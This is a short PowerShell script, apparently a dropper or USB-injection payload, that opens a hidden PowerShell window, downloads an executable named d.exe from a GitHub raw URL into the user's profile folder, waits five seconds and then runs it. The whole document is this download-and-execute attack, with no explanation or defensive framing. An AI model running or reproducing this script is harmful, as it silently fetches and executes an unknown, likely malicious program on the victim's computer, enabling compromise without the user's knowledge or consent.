powershell -WindowStyle Hidden iwr https://github.com/skekic16/lol/raw/main/d.exe?dl=1 -O $Env:USERPROFILE\d.exe
start sleep 5
Start-process "$env:USERPROFILE\d.exe"
